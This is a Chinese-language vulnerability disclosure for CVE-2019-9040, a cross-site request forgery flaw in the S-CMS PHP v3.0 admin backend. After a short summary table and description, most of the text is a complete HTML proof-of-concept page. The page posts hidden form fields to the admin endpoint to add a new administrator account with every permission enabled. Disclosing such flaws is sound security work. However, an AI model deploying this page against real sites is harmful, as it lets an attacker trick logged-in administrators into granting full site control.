### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|S-CMS企业建站系统PHP版v3.0后台存在CSRF可添加管理员权限账号|2019-02-22|qn（137535957@qq.cn）|[https://www.s-cms.cn](https://www.s-cms.cn) | [https://www.s-cms.cn](https://www.s-cms.cn) |PHP v3.0| [CVE-2019-9040](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9040)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。   

### POC实现代码如下：  

> exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/1.com.php/admin/ajax.php?type=admin&action=add&lang=0" method="POST">
      <input type="hidden" name="A&#95;login" value="test1" />
      <input type="hidden" name="A&#95;pwd" value="test1" />
      <input type="hidden" name="A&#95;type" value="1" />
      <input type="hidden" name="A&#95;a0" value="1" />
      <input type="hidden" name="A&#95;a1" value="1" />
      <input type="hidden" name="A&#95;a2" value="1" />
      <input type="hidden" name="A&#95;a3" value="1" />
      <input type="hidden" name="A&#95;a4" value="1" />
      <input type="hidden" name="A&#95;a5" value="1" />
      <input type="hidden" name="A&#95;a6" value="1" />
      <input type="hidden" name="A&#95;a8" value="1" />
      <input type="hidden" name="A&#95;a10" value="1" />
      <input type="hidden" name="A&#95;a7" value="1" />
      <input type="hidden" name="A&#95;a9" value="1" />
      <input type="hidden" name="A&#95;a11" value="1" />
      <input type="hidden" name="A&#95;textauth&#91;&#93;" value="all" />
      <input type="hidden" name="A&#95;productauth&#91;&#93;" value="all" />
      <input type="hidden" name="A&#95;bbsauth&#91;&#93;" value="all" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
